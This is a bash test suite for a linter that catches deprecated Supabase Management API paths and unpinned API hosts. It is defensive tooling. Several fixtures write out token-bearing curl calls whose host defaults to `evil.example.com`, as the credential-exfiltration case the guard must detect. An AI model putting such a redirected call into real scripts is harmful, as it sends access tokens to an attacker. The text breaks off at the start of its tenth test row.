#!/usr/bin/env bash
# Tests for scripts/lint-supabase-deprecated-endpoints.sh.
#
# THE POINT OF THIS SUITE. The guard's two arms fail in OPPOSITE, non-obvious directions and
# both failures are SILENT:
#
#   - Arm 1 fails open if its extraction is line-scoped rather than file-scoped. The live
#     `advisors/security` call in apply-inngest-rls.yml:238 resolves `$API` from an assignment
#     131 lines above it; a line-scoped extractor finds zero deprecated paths, prints
#     "0 violations", and looks exactly like a clean repo.
#   - Arm 2 fails open if its assembly is keyed on the pinned host literal. A redirected host
#     does not CONTAIN the literal, so a literal-keyed assembly never enumerates the exfil
#     shape it exists to catch, and `API="${SUPABASE_API_HOST:-https://evil.example.com}"`
#     sails through while its benign twin reddens.
#
# So this suite does not merely run the guard. It drives it over fixture trees that reproduce
# both shapes at distance, and it asserts the RED arm of every row in the Guard-1 mutation
# matrix -- including the two must-PASS controls, because a guard that reddens on legitimate
# path interpolation gets switched off within a week.
set -uo pipefail

# /tmp on this fleet is a machine-global 4 GiB tmpfs shared by every parallel worktree. A
# DIRECT invocation of this file (rather than one through a runner that already exported
# TMPDIR) inherits bare /tmp, and every fixture tree below then competes with whatever another
# session is holding -- which makes this suite's verdicts a function of another session's disk
# usage. /var/tmp is disk-backed and per-host.
export TMPDIR="${TMPDIR:-/var/tmp}"

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
GUARD="$REPO_ROOT/scripts/lint-supabase-deprecated-endpoints.sh"

passes=0
fails=0
pass() { passes=$((passes + 1)); }
fail() { fails=$((fails + 1)); echo "FAIL: $1" >&2; }

# SETUP FAILURES ARE exit 2, NEVER A VERDICT. A harness that could not build its fixture
# produces a CONFIDENT WRONG answer, not a missing one: the guard runs over an empty or
# half-written tree, finds nothing, and every negative assertion passes for the wrong reason.
setup_die() { echo "SETUP FAILURE: $1" >&2; exit 2; }

[[ -f "$GUARD" ]] || setup_die "guard not found at $GUARD"

WORK="$(mktemp -d -t lint-sup-endpoints.XXXXXXXX)" || setup_die "mktemp -d failed"
trap 'rm -rf "$WORK"' EXIT

# ── Sandbox copies of the GUARD ITSELF ──────────────────────────────────────────────────
# Row 1 mutates the guard's waiver. It is mutated on a COPY, never in place: `git checkout`
# would restore the file to HEAD and silently revert work in flight elsewhere in this worktree.
PRISTINE="$WORK/pristine-guard.sh"
cp "$GUARD" "$PRISTINE" || setup_die "cp guard -> pristine failed"

# ── Fixture plumbing ────────────────────────────────────────────────────────────────────
# Each fixture tree is a real git repo, staged, so the guard runs its REAL `git grep` listing
# path. There is deliberately no non-git fallback in the guard: a second listing path would be
# the one this suite never exercises.
new_tree() {
  local d="$WORK/tree-$1"
  mkdir -p "$d" || setup_die "mkdir $d failed"
  git -C "$d" init -q || setup_die "git init failed in $d"
  printf '%s' "$d"
}
# P1a fixture-dir operand rule (#7652). `seal` takes its tree as a POSITIONAL, and
# `git -C "" add -A` would stage the CALLER's real repository. The body below is the
# CANONICAL copy from plugins/soleur/test/test-helpers.sh, asserted byte-for-byte by
# plugins/soleur/test/fixture-dir-operand-assert.test.sh — do not reword it here.
assert_fixture_dir() {
  case "${1-}" in
    "") printf 'FATAL: fixture dir is EMPTY; git -C "" would operate on %s\n' "$PWD" >&2; exit 2 ;;
    */../*|*/..) printf 'FATAL: fixture dir %s contains ..; refusing\n' "$1" >&2; exit 2 ;;
    /proc/*|/sys/*|/dev/*) printf 'FATAL: fixture dir %s is a synthetic-fs path; refusing\n' "$1" >&2; exit 2 ;;
    /|//|/.) printf 'FATAL: fixture dir resolves to the filesystem root; refusing\n' >&2; exit 2 ;;
    /*) : ;;
    *)  printf 'FATAL: fixture dir %s is RELATIVE; refusing\n' "$1" >&2; exit 2 ;;
  esac
}
seal() { assert_fixture_dir "$1"; git -C "$1" add -A || setup_die "git add -A failed in $1"; }

OUT="$WORK/out.txt"
RC=0
# Runs a guard (possibly a mutant copy) against a fixture tree with a fixture baseline.
# Output goes to a FILE. Never `producer | grep -q PATTERN`: under pipefail an early match
# makes the producer take SIGPIPE (141), so the pipeline exits non-zero even though grep
# MATCHED -- which makes every negative assertion built that way fail OPEN.
run_guard() {
  local script="$1" root="$2" hw="$3"; shift 3
  LINT_SUPABASE_ENDPOINTS_ROOT="$root" LINT_SUPABASE_ENDPOINTS_HIGHWATER="$hw" \
    bash "$script" "$@" >"$OUT" 2>&1
  RC=$?
}
out_has() { [[ "$(grep -cE -- "$1" "$OUT" || true)" -gt 0 ]]; }
out_count() { grep -cE -- "$1" "$OUT" || true; }

write_hw() { printf '%s  # fixture baseline\n' "$2" > "$1" || setup_die "write_hw $1 failed"; }

# ── FIXTURE PLACEHOLDERS — and why this file may not contain a literal call construct ──
# THIS FILE IS TRACKED, and the guard scans tracked files. A fixture heredoc written out
# literally is not an assertion string the call-construct anchor can forgive -- at rest in the
# tree it IS a real call construct, and the guard reds on its own test suite. (Measured: the
# literal form of this suite produced 3 violations and 3 spurious waived sites against the live
# repo.) The anchor keeps the guard off strings that DESCRIBE a call; nothing can keep it off a
# string that IS one. So fixture bodies carry placeholders and are expanded at write time. The
# files that reach disk are byte-for-byte what the live repo contains -- the fidelity that
# matters is the fixture's, not this source file's.
_HOST='https://api.supabase.com'
_SEG='/v1/projects/'
# The same segment WITHOUT the trailing slash — the shape a base built in one statement and
# consumed in the next actually has at rest. Rows 8/8b turn on the difference.
_SEGB='/v1/projects'
_ADV='advisors/security'
_LOGS='analytics/endpoints/logs.all'
_EVIL='${SUPABASE_API_HOST:-https://evil.example.com}'
_SOFT='${SUPABASE_API_HOST:-https://api.supabase.com}'
fixture() {
  sed -e "s#@HOST@#${_HOST}#g" -e "s#@SEG@#${_SEG}#g" -e "s#@ADV@#${_ADV}#g" \
      -e "s#@LOGS@#${_LOGS}#g" -e "s#@EVIL@#${_EVIL}#g" -e "s#@SOFT@#${_SOFT}#g"
}

echo "=== lint-supabase-deprecated-endpoints.sh ==="

# ════════════════════════════════════════════════════════════════════════════════════════
# BASELINE FIXTURE — three deprecated call sites in the three shapes that occur live, plus
# the two non-call shapes that a bare-token guard miscounts.
# ════════════════════════════════════════════════════════════════════════════════════════
T="$(new_tree base)"
mkdir -p "$T/.github/workflows" "$T/scripts" || setup_die "mkdir fixture subdirs failed"

# SHAPE 1 — host assigned at the top of a `run: |` block, deprecated call 30 lines below.
# This is the apply-inngest-rls.yml:107-vs-:238 split in miniature and it is the single most
# important line in this file: a line-scoped extractor scores 0 here.
{
  printf 'name: fixture\njobs:\n  x:\n    steps:\n      - run: |\n'
  printf '          API="%s"   # pinned\n' "$_HOST"
  for i in $(seq 1 30); do printf '          echo "filler %s"\n' "$i"; done
  printf '          adv="$(curl --silent "$API%s${PROJECT_REF}/%s")"\n' "$_SEG" "$_ADV"
} > "$T/.github/workflows/wf.yml" || setup_die "write wf.yml failed"

# SHAPE 2 — plain shell, host in a variable, PLUS a `case` pattern carrying the same string
# with no host token. The case line is the guard-of-the-guard control: it must NOT be counted.
fixture > "$T/scripts/scan.sh" <<'FIX' || setup_die "write scan.sh failed"
#!/usr/bin/env bash
API="@HOST@" # pinned
route() {
  case "$1" in
    *"/@ADV@"*) echo advisor ;;
  esac
}
resp="$(curl --url "$API@SEG@${REF}/@ADV@")"
FIX
[[ -s "$T/scripts/scan.sh" ]] || setup_die "write scan.sh failed"

# SHAPE 3 — the host literal written inline in the URL.
fixture > "$T/scripts/probe.sh" <<'FIX' || setup_die "write probe.sh failed"
#!/usr/bin/env bash
body=$(curl -sS "@HOST@@SEG@$REF/@ADV@")
FIX
[[ -s "$T/scripts/probe.sh" ]] || setup_die "write probe.sh failed"
seal "$T"

HW="$WORK/base.hw"
run_guard "$GUARD" "$T" "$HW" --census
BASE_CENSUS="$(cat "$OUT")"
if [[ "$BASE_CENSUS" == "3" ]]; then pass; else
  fail "baseline census is '$BASE_CENSUS', expected 3 — the extractor is not seeing all three call shapes (or is counting the host-less case pattern)"
fi
write_hw "$HW" "$BASE_CENSUS"

# BASELINE MUST BE GREEN. Every mutant below is only meaningful against a green baseline: a
# fixture that is already red makes every "mutant RED" assertion vacuously true.
run_guard "$GUARD" "$T" "$HW"
if [[ "$RC" -eq 0 ]]; then pass; else fail "baseline fixture is not GREEN (rc=$RC); every mutant assertion below would be vacuous. Output: $(cat "$OUT")"; fi
if out_has 'waived deprecated call sites \(3\)'; then pass; else fail "baseline should report exactly 3 WAIVED advisors/security sites; got: $(cat "$OUT")"; fi

# ── ROW 1 — remove the advisors/security waiver → RED on the real call sites ────────────
MUT1="$WORK/mut1-guard.sh"
cp "$PRISTINE" "$MUT1" || setup_die "cp for row 1 failed"
sed -i 's/WAIVED-2026-08-26/NONE/g' "$MUT1" || setup_die "sed mutation for row 1 failed"
# THE MUTATION MUST HAVE LANDED. A sed that matched nothing leaves a byte-identical copy, the
# run reports the BASELINE, and "mutant RED" fails in a way indistinguishable from a pass.
if diff -q "$PRISTINE" "$MUT1" >/dev/null 2>&1; then
  setup_die "row-1 mutation did not land — the waiver token was not found in the guard"
fi
pass  # mutation landed

run_guard "$MUT1" "$T" "$HW"
if [[ "$RC" -eq 1 ]]; then pass; else fail "row 1: un-waiving advisors/security must exit 1, got rc=$RC. Output: $(cat "$OUT")"; fi
n="$(out_count 'DEPRECATED-NO-WAIVER advisors/security')"
if [[ "$n" -eq 3 ]]; then pass; else fail "row 1: expected exactly 3 DEPRECATED-NO-WAIVER findings (one per call shape), got $n. Output: $(cat "$OUT")"; fi
# The distance case specifically. If only this one is missing, the extractor is line-scoped.
# Asserted as a DISTANCE, not as a hard-coded line number: the number is incidental to the
# fixture's filler count, but the >= 30 line gap is the property, and pinning the incidental
# number would let a future edit shrink the gap to zero while the assertion stayed green.
wf_assign="$(grep -nF "API=\"$_HOST\"" "$T/.github/workflows/wf.yml" | head -1 | cut -d: -f1)"
wf_hit="$(sed -n 's#^\.github/workflows/wf\.yml:\([0-9]*\): DEPRECATED-NO-WAIVER.*#\1#p' "$OUT" | head -1)"
if [[ -n "$wf_hit" && -n "$wf_assign" && $((wf_hit - wf_assign)) -ge 30 ]]; then pass; else
  fail "row 1: the call >=30 lines BELOW its API= assignment was not found (assign=${wf_assign:-?}, hit=${wf_hit:-none}) — the extractor is line-scoped, which is fail-open"
fi
# ...and the host-less `case` pattern must still NOT be a finding.
if out_has 'scan\.sh:5:'; then
  fail "row 1: the host-less \`case\` pattern was counted as a call — the guard is matching a bare token, not the call construct"
else pass; fi

# ── ROW 1 (live) — the non-vacuity proof, against the real repo ────────────────────────
# Deliberately NOT pinned to a hard-coded N: the other workstreams in this PR add Management
# API callers, and a hard N here would red the moment they merge. The invariant that matters
# is that the live waived population is NON-EMPTY and that un-waiving converts ALL of it to
# findings -- i.e. the guard's waiver is the only thing keeping the live tree green.
run_guard "$GUARD" "$REPO_ROOT" "$REPO_ROOT/scripts/lint-supabase-deprecated-endpoints.highwater"
live_waived="$(sed -n 's/^waived deprecated call sites (\([0-9]*\)):.*/\1/p' "$OUT")"
if [[ "${live_waived:-0}" -ge 1 ]]; then pass; else
  fail "row 1 (live): the real repo reports ${live_waived:-0} waived advisors/security sites. A guard whose live population is empty proves nothing"
fi
run_guard "$MUT1" "$REPO_ROOT" "$REPO_ROOT/scripts/lint-supabase-deprecated-endpoints.highwater"
live_found="$(out_count 'DEPRECATED-NO-WAIVER advisors/security')"
if [[ "$RC" -eq 1 && "$live_found" -eq "${live_waived:-0}" ]]; then pass; else
  fail "row 1 (live): un-waiving should red the live tree on all ${live_waived:-0} waived sites; got rc=$RC with $live_found findings"
fi

# ── ROW 2 — a new caller of analytics/endpoints/logs.all → RED, no mutation needed ─────
T2="$(new_tree logs)"
mkdir -p "$T2/scripts" || setup_die "mkdir T2/scripts failed"
cp "$T/scripts/scan.sh" "$T2/scripts/scan.sh" || setup_die "cp scan.sh -> T2 failed"
fixture > "$T2/scripts/logs.sh" <<'FIX' || setup_die "write logs.sh failed"
#!/usr/bin/env bash
API="@HOST@"
curl --url "$API@SEG@${REF}/@LOGS@?sql=$Q"
FIX
[[ -s "$T2/scripts/logs.sh" ]] || setup_die "write logs.sh failed"
seal "$T2"
run_guard "$GUARD" "$T2" "$HW" --census
write_hw "$WORK/t2.hw" "$(cat "$OUT")"
run_guard "$GUARD" "$T2" "$WORK/t2.hw"
if [[ "$RC" -eq 1 ]]; then pass; else fail "row 2: a logs.all caller must be RED with no waiver available, got rc=$RC. Output: $(cat "$OUT")"; fi
if out_has 'DEPRECATED-NO-WAIVER analytics/endpoints/logs\.all'; then pass; else
  fail "row 2: expected a DEPRECATED-NO-WAIVER finding naming logs.all. Output: $(cat "$OUT")"
fi

# ── ROW 3 — host span interpolated → RED, in BOTH directions ───────────────────────────
# The two halves are the entire reason arm 2 inverts its quantifier. The benign-looking twin
# (default = the correct host) is easy; the EXFIL twin (default = an attacker host) is the one
# a literal-keyed assembly never even enumerates.
for variant in benign evil; do
  T3="$(new_tree "hostspan-$variant")"
  mkdir -p "$T3/scripts" || setup_die "mkdir T3 failed"
  cp "$T/scripts/scan.sh" "$T3/scripts/scan.sh" || setup_die "cp scan.sh -> T3 failed"
  if [[ "$variant" == benign ]]; then host="$_SOFT"; else host="$_EVIL"; fi
  {
    printf '#!/usr/bin/env bash\n'
    printf 'API="%s"\n' "$host"
    printf 'curl --url "$API%s${REF}/database/query" -H "Authorization: Bearer $SUPABASE_ACCESS_TOKEN"\n' "$_SEG"
  } > "$T3/scripts/redirect.sh" || setup_die "write redirect.sh failed"
  seal "$T3"
  run_guard "$GUARD" "$T3" "$HW" --census
  write_hw "$WORK/t3.hw" "$(cat "$OUT")"
  run_guard "$GUARD" "$T3" "$WORK/t3.hw"
  if [[ "$RC" -eq 1 ]]; then pass; else
    fail "row 3 ($variant): an interpolated HOST SPAN must be RED, got rc=$RC. Output: $(cat "$OUT")"
  fi
  if out_has 'redirect\.sh:0: (HOST-SPAN-NOT-PINNED|UNPINNED-HOST)'; then pass; else
    fail "row 3 ($variant): expected a host-pin finding on redirect.sh. Output: $(cat "$OUT")"
  fi
done

# ── ROW 4 — a SECOND non-compliant caller after a compliant one → RED, BOTH reported ───
# A guard that stops at the first offender turns a batch cleanup into N sequential CI rounds,
# and worse, makes "one finding" indistinguishable from "one remaining finding".
T4="$(new_tree two-offenders)"
mkdir -p "$T4/scripts" || setup_die "mkdir T4 failed"
cp "$T/scripts/scan.sh" "$T4/scripts/scan.sh" || setup_die "cp scan.sh -> T4 failed"
fixture > "$T4/scripts/compliant.sh" <<'FIX' || setup_die "write compliant.sh failed"
#!/usr/bin/env bash
API="@HOST@"
curl --url "$API@SEG@${REF}/database/query"
FIX
fixture > "$T4/scripts/bad-one.sh" <<'FIX' || setup_die "write bad-one.sh failed"
#!/usr/bin/env bash
API="@EVIL@"
curl --url "$API@SEG@${REF}/database/query" -H "Authorization: Bearer $SUPABASE_ACCESS_TOKEN"
FIX
fixture > "$T4/scripts/bad-two.sh" <<'FIX' || setup_die "write bad-two.sh failed"
#!/usr/bin/env bash
API="@HOST@"
curl --url "$API@SEG@${REF}/@LOGS@"
FIX
for f in compliant bad-one bad-two; do [[ -s "$T4/scripts/$f.sh" ]] || setup_die "write $f.sh failed"; done
seal "$T4"
run_guard "$GUARD" "$T4" "$HW" --census
write_hw "$WORK/t4.hw" "$(cat "$OUT")"
run_guard "$GUARD" "$T4" "$WORK/t4.hw"
if [[ "$RC" -eq 1 ]]; then pass; else fail "row 4: two offenders must be RED, got rc=$RC. Output: $(cat "$OUT")"; fi
if out_has 'bad-one\.sh:0:' && out_has 'bad-two\.sh:'; then pass; else
  fail "row 4: BOTH offenders must be reported in one run. Output: $(cat "$OUT")"
fi
if out_has 'compliant\.sh'; then
  fail "row 4: the compliant caller was reported — a false positive alongside real findings is how a guard gets muted"
else pass; fi

# ── ROW 5 — delete a call site → census drops → RED via --check-highwater ──────────────
T5="$(new_tree ratchet)"
mkdir -p "$T5/scripts" || setup_die "mkdir T5 failed"
fixture > "$T5/scripts/calls.sh" <<'FIX' || setup_die "write calls.sh failed"
#!/usr/bin/env bash
API="@HOST@"
curl --url "$API@SEG@${REF}/database/query"
curl --url "$API@SEG@${REF}/api-keys"
curl --url "$API@SEG@${REF}/config/auth"
FIX
[[ -s "$T5/scripts/calls.sh" ]] || setup_die "write calls.sh failed"
seal "$T5"
run_guard "$GUARD" "$T5" "$HW" --census
C5="$(cat "$OUT")"
if [[ "$C5" == "3" ]]; then pass; else fail "row 5: expected a 3-site fixture census, got '$C5'"; fi
write_hw "$WORK/t5.hw" "3"
run_guard "$GUARD" "$T5" "$WORK/t5.hw" --check-highwater
if [[ "$RC" -eq 0 ]]; then pass; else fail "row 5: census at baseline must be green, got rc=$RC. Output: $(cat "$OUT")"; fi

PRISTINE5="$WORK/calls-pristine.sh"
cp "$T5/scripts/calls.sh" "$PRISTINE5" || setup_die "cp calls.sh -> pristine failed"
sed -i '/api-keys/d' "$T5/scripts/calls.sh" || setup_die "sed delete-a-call-site failed"
if diff -q "$PRISTINE5" "$T5/scripts/calls.sh" >/dev/null 2>&1; then
  setup_die "row-5 mutation did not land — the call site was not deleted"
fi
pass  # mutation landed
seal "$T5"
run_guard "$GUARD" "$T5" "$WORK/t5.hw" --check-highwater
if [[ "$RC" -eq 1 ]]; then pass; else fail "row 5: a vanished call site must red the ratchet, got rc=$RC. Output: $(cat "$OUT")"; fi
if out_has 'census is 2 Management API call sites, below the committed baseline of 3'; then pass; else
  fail "row 5: the ratchet message must name both numbers so an operator can tell a deletion from a blind extractor. Output: $(cat "$OUT")"
fi
# And the DIRECTION: growth is a note, not a failure.
write_hw "$WORK/t5up.hw" "1"
run_guard "$GUARD" "$T5" "$WORK/t5up.hw" --check-highwater
if [[ "$RC" -eq 0 ]] && out_has 'Raise .* to 2 to lock the coverage in'; then pass; else
  fail "row 5: a census ABOVE the baseline is legitimate growth and must be an advisory note, not a failure. rc=$RC, output: $(cat "$OUT")"
fi

# ── ROW 6 — a compliant caller whose PATH interpolates ${REF} → PASS ───────────────────
# THE FALSE-POSITIVE CONTROL. The four existing per-script guards assert their whole `API=`
# LINE is expansion-free, which is right for a bare assignment and wrong as an assembly rule:
# a whole-line check reds ~8 correctly-pinned files, lib/supabase/service.ts among them.
T6="$(new_tree path-interp)"
mkdir -p "$T6/scripts" "$T6/lib" || setup_die "mkdir T6 failed"
fixture > "$T6/scripts/pinned.sh" <<'FIX' || setup_die "write pinned.sh failed"
#!/usr/bin/env bash
API="@HOST@"
curl --url "$API@SEG@${REF}/database/query" -H "Authorization: Bearer $SUPABASE_ACCESS_TOKEN"
curl --url "$API@SEG@${PROJECT_REF}/api-keys"
FIX
# The TypeScript member: a template literal whose PATH interpolates. Legitimate, and the exact
# shape a whole-line expansion check would have reddened.
fixture > "$T6/lib/service.ts" <<'FIX' || setup_die "write service.ts failed"
export async function readAuthConfig(projectRef: string) {
  return fetch(
    `@HOST@@SEG@${projectRef}/config/auth`,
    { headers: { Authorization: `Bearer ${process.env.SUPABASE_ACCESS_TOKEN}` } },
  );
}
FIX
for f in "$T6/scripts/pinned.sh" "$T6/lib/service.ts"; do [[ -s "$f" ]] || setup_die "write $f failed"; done
seal "$T6"
run_guard "$GUARD" "$T6" "$HW" --census
C6="$(cat "$OUT")"
write_hw "$WORK/t6.hw" "$C6"
run_guard "$GUARD" "$T6" "$WORK/t6.hw"
if [[ "$RC" -eq 0 ]]; then pass; else
  fail "row 6: PATH interpolation on a correctly-pinned HOST must PASS — this guard asserts the host span only. rc=$RC, output: $(cat "$OUT")"
fi
if [[ "$C6" == "3" ]]; then pass; else fail "row 6: expected 3 enumerated call sites (2 shell + 1 template literal), got '$C6' — if the .ts line is missing the guard is blind to the one TypeScript caller class"; fi

# ── ROW 6b — a TypeScript caller that resolves its host through `const` → PASS ────────
# THE SECOND FALSE-POSITIVE CONTROL, and the one that was live-broken. The RHS resolver
# recognised only the shell's space-free `V=`, so `const API = "https://api.supabase.com"` was
# an assignment it could not see: a correctly-pinned .ts caller reported UNRESOLVABLE-HOST.
# Fail-closed is the right direction to be wrong in, and it is still wrong — this is the shape
# the next TypeScript caller has, and a guard that reds on the compliant shape gets switched
# off. Distinct from row 6's service.ts, which writes the host INLINE and so never exercises
# the resolver at all.
T6B="$(new_tree ts-const)"
mkdir -p "$T6B/lib" || setup_die "mkdir T6B failed"
fixture > "$T6B/lib/client.ts" <<'FIX' || setup_die "write client.ts failed"
const API = "@HOST@";

export async function runQuery(ref: string) {
  return fetch(`${API}@SEG@${ref}/database/query`, {
    headers: { Authorization: `Bearer ${process.env.SUPABASE_ACCESS_TOKEN}` },
  });
}
FIX
[[ -s "$T6B/lib/client.ts" ]] || setup_die "write client.ts failed"
seal "$T6B"
run_guard "$GUARD" "$T6B" "$HW" --census
C6B="$(cat "$OUT")"
write_hw "$WORK/t6b.hw" "$C6B"
run_guard "$GUARD" "$T6B" "$WORK/t6b.hw"
if [[ "$RC" -eq 0 ]]; then pass; else
  fail "row 6b: a .ts caller pinned via \`const API = <literal>\` must PASS. rc=$RC, output: $(cat "$OUT")"
fi
if out_has 'client\.ts:0: UNRESOLVABLE-HOST'; then
  fail "row 6b: the resolver did not recognise \`const NAME = …\` as an assignment, so a correctly-pinned TypeScript caller is reported unprovable. Output: $(cat "$OUT")"
else pass; fi

# ── ROW 7 — a fixture tree with zero deprecated paths → PASS ──────────────────────────
# The must-PASS non-canonical input. A guard that rejects everything is not a guard.
T7="$(new_tree clean)"
mkdir -p "$T7/scripts" || setup_die "mkdir T7 failed"
fixture > "$T7/scripts/clean.sh" <<'FIX' || setup_die "write clean.sh failed"
#!/usr/bin/env bash
# Talks to the Management API, pinned, and touches no deprecated path.
API="@HOST@"
curl --url "$API@SEG@${REF}/database/query" -H "Authorization: Bearer $SUPABASE_ACCESS_TOKEN"
FIX
[[ -s "$T7/scripts/clean.sh" ]] || setup_die "write clean.sh failed"
seal "$T7"
run_guard "$GUARD" "$T7" "$HW" --census
write_hw "$WORK/t7.hw" "$(cat "$OUT")"
run_guard "$GUARD" "$T7" "$WORK/t7.hw"
if [[ "$RC" -eq 0 ]]; then pass; else fail "row 7: a clean tree must PASS, got rc=$RC. Output: $(cat "$OUT")"; fi
if out_has 'waived deprecated call sites'; then
  fail "row 7: a clean tree must report no waived sites. Output: $(cat "$OUT")"
else pass; fi

# ── ROW 8 — THE SPLIT-BASE CONSTRUCT: one file that defeated BOTH arms at once ─────────
# The regression this suite exists for after the fact. A single file that is, simultaneously:
# a PAT-bearing call, to an env-redirected host, at the ONE deprecated path carrying no
# waiver. Every arm should have fired. The guard printed `0 violations` for two INDEPENDENT
# reasons, and this row fails if either one comes back:
#
#   (a) arm 2's membership test read the RAW file, so the `# host pin: …` COMMENT satisfied
#       the host pin. The comment is deliberately present here and is the whole trick: strip
#       it and the file reds even on the pre-fix guard, which would make this row prove
#       nothing. (Live instance: inngest.tf, whose only host literal is a `#` comment.)
#   (b) the call-construct anchor demanded `/v1/projects/` WITH the trailing slash. `BASE`
#       ends that segment on a quote, so the census scored zero for the file.
T9="$(new_tree split-base)"
mkdir -p "$T9/scripts" || setup_die "mkdir T9 failed"
{
  printf '#!/usr/bin/env bash\n'
  printf '# host pin: %s is the only permitted host\n' "$_HOST"
  printf 'BASE="%s%s"\n' "$_EVIL" "$_SEGB"
  printf 'curl -H "Authorization: Bearer $SUPABASE_ACCESS_TOKEN" "$BASE/$REF/%s"\n' "$_LOGS"
} > "$T9/scripts/exfil.sh" || setup_die "write exfil.sh failed"
[[ -s "$T9/scripts/exfil.sh" ]] || setup_die "write exfil.sh failed"
# The comment must really be the file's ONLY host literal, or sub-cause (a) is not under test.
if [[ "$(grep -cF -- "$_HOST" "$T9/scripts/exfil.sh" || true)" -eq 1 ]] \
   && [[ "$(grep -vE '^[[:space:]]*#' "$T9/scripts/exfil.sh" | grep -cF -- "$_HOST" || true)" -eq 0 ]]; then
  pass
else
  setup_die "row 8 fixture is malformed: the host literal must appear exactly once, on a COMMENT line"
fi
seal "$T9"
run_guard "$GUARD" "$T9" "$HW" --census
C9="$(cat "$OUT")"
write_hw "$WORK/t9.hw" "$C9"
run_guard "$GUARD" "$T9" "$WORK/t9.hw"
if [[ "$RC" -eq 1 ]]; then pass; else
  fail "row 8: a PAT-bearing call to an env-redirected host at a no-waiver deprecated path must be RED, got rc=$RC. Output: $(cat "$OUT")"
fi
# (a). A comment is not a pin. ASSERTED AS `UNPINNED-HOST` SPECIFICALLY, not as "some host
# finding": the inline-URL span scan also reds this file, and it does so via the (b) fix, so
# the looser assertion stayed GREEN with (a) mutated back out and proved nothing. (Measured.)
# UNPINNED-HOST is the one finding that turns purely on membership being read from code lines.
if out_has 'exfil\.sh:0: UNPINNED-HOST'; then pass; else
  fail "row 8(a): the host pin was satisfied by COMMENT TEXT — arm 2 is reading the raw file, not code lines, so any file can buy the pin with one comment. Output: $(cat "$OUT")"
fi
# (b). The census must SEE the split base; a guard that counts zero here is blind to the caller.
if [[ "$C9" -ge 1 ]]; then pass; else
  fail "row 8(b): the census scored $C9 on a file that plainly calls the Management API — the call-construct anchor is still demanding a trailing slash after /v1/projects"
fi

# ── ROW 8b — the same split base, CORRECTLY PINNED → must be COUNTED and must PASS ─────
# Sub-cause (b) isolated from arm 2 entirely. Coverage is the property under test: the anchor
# fix must make this caller VISIBLE (census >= 1) without making it a violation. Asserting
# only row 8 would let someone "fix" (b) by reddening every split base.
T10="$(new_tree split-base-pinned)"
mkdir -p "$T10/scripts" || setup_die "mkdir T10 failed"
{
  printf '#!/usr/bin/env bash\n'
  printf 'API="%s"\n' "$_HOST"
  printf 'BASE="${API}%s"\n' "$_SEGB"
  printf 'curl --url "$BASE/$REF/database/query" -H "Authorization: Bearer $SUPABASE_ACCESS_TOKEN"\n'
} > "$T10/scripts/split.sh" || setup_die "write split.sh failed"
[[ -s "$T10/scripts/split.sh" ]] || setup_die "write split.sh failed"
seal "$T10"
run_guard "$GUARD" "$T10" "$HW" --census
C10="$(cat "$OUT")"
if [[ "$C10" -ge 1 ]]; then pass; else
  # The message names the shape by INTERPOLATING _SEGB rather than spelling it. Written out,
  # this line would be a real call construct at rest in a tracked file and the guard would red
  # on its own suite — the hazard the placeholder block above exists for, reappearing in a
  # failure string. (Measured: it did.)
  fail "row 8b: a pinned base built as \${API}${_SEGB} is INVISIBLE to the census (got '$C10'). The caller exists; the extractor has gone blind, which is the failure mode the ratchet cannot see either"
fi
write_hw "$WORK/t10.hw" "$C10"
run_guard "$GUARD" "$T10" "$WORK/t10.hw"
if [[ "$RC" -eq 0 ]]; then pass; else
  fail "row 8b: a CORRECTLY PINNED split base must PASS — widening the anchor must buy visibility, not false positives. rc=$RC, output: $(cat "$OUT")"
fi

# ── ROW 9 — an allowlisted non-caller grows a PINNED call → ALLOWLIST-STALE ────────────
# The allowlist buys "this file is not a caller", never "this file is exempt", and the guard's
# header promises that a real call stops it covering the file. That promise was FALSE in its
# likeliest case: the staleness check sat inside `if has_literal -eq 0`, so a file that added a
# properly-pinned PAT-bearing curl scored has_literal > 0, skipped the branch, and reported
# clean. Only the unpinned case — where UNPINNED-HOST would have fired anyway — ever reached it.
#
# COUPLING, DELIBERATE AND NAMED: this fixture path must be a member of the guard's ALLOWLIST
# array. It is asserted below rather than assumed, so removing the entry fails LOUDLY here
# instead of quietly turning this row vacuous.
STALE_REL='apps/web-platform/scripts/run-migrations.sh'
if [[ "$(grep -cF -- "'${STALE_REL}|" "$GUARD" || true)" -gt 0 ]]; then pass; else
  setup_die "row 9 needs $STALE_REL on the guard's ALLOWLIST; it is not there, so this row would test nothing"
fi
T11="$(new_tree allowlist-stale)"
mkdir -p "$T11/$(dirname "$STALE_REL")" || setup_die "mkdir T11 failed"
{
  printf '#!/usr/bin/env bash\n'
  printf 'API="%s"\n' "$_HOST"
  printf 'curl --url "$API%s${REF}/database/query" -H "Authorization: Bearer $SUPABASE_ACCESS_TOKEN"\n' "$_SEG"
} > "$T11/$STALE_REL" || setup_die "write $STALE_REL failed"
[[ -s "$T11/$STALE_REL" ]] || setup_die "write $STALE_REL failed"
seal "$T11"
run_guard "$GUARD" "$T11" "$HW" --census
write_hw "$WORK/t11.hw" "$(cat "$OUT")"
run_guard "$GUARD" "$T11" "$WORK/t11.hw"
if [[ "$RC" -eq 1 ]]; then pass; else
  fail "row 9: an allowlisted non-caller that grew a real call must be RED, got rc=$RC. Output: $(cat "$OUT")"
fi
if out_has 'run-migrations\.sh:0: ALLOWLIST-STALE'; then pass; else
  fail "row 9: expected ALLOWLIST-STALE. The call is correctly PINNED, so nothing else fires — nested under has_literal, this finding is unreachable and the allowlist silently becomes a permanent exemption. Output: $(cat "$OUT")"
fi

# ── ROW 10 — NO `| grep -q` MID-PIPE, anywhere in either file ─────────────────────────
# A SHAPE ASSERTION, deliberately, because this defect is INVISIBLE TO BEHAVIOURAL TESTING AT
# THE CURRENT SCALE. `printf '%s\n' "$list" | grep -qxF -- "$x" && flag=1` is correct until the
# producer's output exceeds the pipe buffer: grep exits on the first match, printf takes
# SIGPIPE, and under `pipefail` the PIPELINE reports failure even though grep MATCHED — so the
# `&&` never fires and the guard silently skips the work for exactly the input it matched.
#
# Measured on this machine, first entry matching, 300-byte paths:
#      30 paths /  9 KB  -> flag=1  (correct — this is today's live assembly, hence latent)
#     300 paths / 92 KB  -> flag=0  (WRONG; the herestring form is 1 at every size)
#
# A fixture big enough to cross that threshold needs ~400 tracked files and cost 16s of guard
# runtime in trial — a real price for a bug whose whole character is that it waits. The shape
# is what regresses, so the shape is what is asserted, and it reddens in milliseconds.
# Comment lines are excluded: both files DESCRIBE the forbidden form in prose, which is the
# bare-token-over-prose distinction the guard itself is built on.
qpipe_hits=0
